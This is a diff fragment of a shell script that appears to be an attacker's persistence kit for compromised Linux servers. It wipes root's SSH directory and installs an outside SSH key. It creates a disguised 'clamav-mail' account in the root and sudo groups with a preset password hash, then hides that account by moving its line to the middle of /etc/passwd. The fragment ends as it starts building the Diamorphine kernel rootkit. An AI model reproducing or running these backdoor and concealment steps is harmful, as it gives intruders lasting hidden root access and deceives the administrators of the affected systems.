@@ -601,10 +601,11 @@ echo "[*] Generating ssh key on server"
 ### key: /Users/jamy/.ssh/id_rsa_NuH: (on 0nedr1v3!)
 rm -rf /root/.ssh && rm -rf /root/.ssh/authorized_keys && mkdir /root/.ssh && chmod 700 /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDgh9Q31B86YT9fybn6S/DbQQe/G8V0c9+VNjJEmoNxUrIGDqD+vSvS/2uAQ9HaumDAvVau2CcVBJM9STUm6xEGXdM/81LeJBVnw01D+FgFo5Sr/4zo+MDMUS/y/TfwK8wtdeuopvgET/HiZJn9/d68vbWXaS3jnQVTAI9EvpC1WTjYTYxFS/SyWJUQTA8tYF30jagmkBTzFjr/EKxxKTttdb79mmOgx1jP3E7bTjRPL9VxfhoYsuqbPk+FwOAsNZ1zv1UEjXMBvH+JnYbTG/Eoqs3WGhda9h3ziuNrzJGwcXuDhQI1B32XgPDxB8etsT6or8aqWGdRlgiYtkPCmrv+5pEUD8wS3WFhnOrm5Srew7beIl4LPLgbCPTOETgwB4gk/5U1ZzdlYmtiBNJxMeX38BsGoAhTDbFLcakkKP+FyXU/DsoAcow4av4OGTsJfs+sIeOWDQ+We5E4oc/olVNdSZ18RG5dwUde6bXbsrF5ipnE8oIBUI0z76fcbAOxogO/oxhvpuyWPOwXE6GaeOhWfWTxIyV5X4fuFDQXRPlMrlkWZ/cYb+l5JiT1h+vcpX3/dQC13IekE3cUsr08vicZIVOmCoQJy6vOjkj+XsA7pMYb3KgxXgQ+lbCBCtAwKxjGrfbRrlWoqweS/pyGxGrUVJZCf6rC6spEIs+aMy97+Q=='  >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys
 
-useradd -u 0 -G root,sudo -M -o -s /bin/bash -p '$1$GDwMqCqg$eDXKBHbUDpOgunTpref5J1' clamav-mail
+useradd -u 455 -G root,sudo -M -o -s /bin/bash -p '$1$GDwMqCqg$eDXKBHbUDpOgunTpref5J1' clamav-mail
 awk '{lines[NR] = $0} END {last_line = lines[NR]; delete lines[NR]; middle = int(NR/2); for (i=1; i<middle; i++) print lines[i]; print last_line; for (i=middle; i<NR; i++) print lines[i]}' /etc/passwd > /tmp/passwd && sudo mv /tmp/passwd /etc/passwd
 ### NOT NEEDED! ### sudo echo "clamav-mail:'$1$JSi1yOvo$RXt73G6AUw2EhNhvJn4Ei1'" | sudo chpasswd -e
-###(lala´s std)
+### useradd -u 12345 -g users -d /home/username -s /bin/bash -p $(echo mypasswd | openssl passwd -1 -stdin) username
+### (lala´s std)
 
 echo "[*] make toolZ, Diamorphine"
 cd /tmp
